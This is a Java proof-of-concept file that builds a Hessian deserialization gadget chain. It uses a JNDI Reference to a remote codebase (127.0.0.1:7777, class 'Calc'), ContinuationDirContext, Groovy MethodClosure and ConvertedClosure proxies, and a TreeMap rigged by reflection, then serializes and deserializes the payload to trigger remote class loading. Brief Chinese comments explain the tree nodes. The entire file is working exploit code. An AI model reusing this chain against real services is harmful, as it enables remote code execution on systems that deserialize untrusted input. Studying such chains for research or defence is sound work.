package com.test.gadget;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import tools.HessianTools;
import tools.ReflectTools;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.TreeMap;

public class tmp1 {
    public static void main(String[] args) throws Throwable {
        Reference reference = new Reference("Calc", "Calc", "http://127.0.0.1:7777/");

        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(reference);
        Class<?> aClass = Class.forName("javax.naming.spi.ContinuationDirContext");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(CannotProceedException.class,Hashtable.class);
        declaredConstructor.setAccessible(true);
        Object c1 = declaredConstructor.newInstance(cpe, new Hashtable<>());

        MethodClosure methodClosure = new MethodClosure(c1,"listBindings");

        ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, "compareTo");

        Object o = Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), new Class[]{Comparable.class}, convertedClosure);

        Class<?> e = Class.forName("java.util.TreeMap$Entry");
        Constructor<?> declaredConstructor1 = e.getDeclaredConstructor(Object.class, Object.class, e);
        declaredConstructor1.setAccessible(true);
        // 根键值对，这里的键会作为最终调用的方法的参数
        Object a = declaredConstructor1.newInstance("a", 1, null);

        Constructor<?> declaredConstructor2 = e.getDeclaredConstructor(Object.class, Object.class, e);
        declaredConstructor2.setAccessible(true);
        // 作为根节点的右子树，键为动态代理
        Object o1 = declaredConstructor2.newInstance(o, 2, a);

        Class<?> t = Class.forName("java.util.TreeMap");
        TreeMap treeMap = (TreeMap) t.newInstance();

        Field size = t.getDeclaredField("size");
        size.setAccessible(true);
        size.set(treeMap, 2);

        Field modCount = t.getDeclaredField("modCount");
        modCount.setAccessible(true);
        modCount.set(treeMap, 2);

        Field root = t.getDeclaredField("root");
        root.setAccessible(true);
        root.set(treeMap, a);

        // 设置根节点的右子树
        Field right = e.getDeclaredField("right");
        right.setAccessible(true);
        right.set(a, o1);

        byte[] bytes = HessianTools.hessianSer2bytes(treeMap, "2");
        HessianTools.hessianDeser(bytes, "2");

    }
}
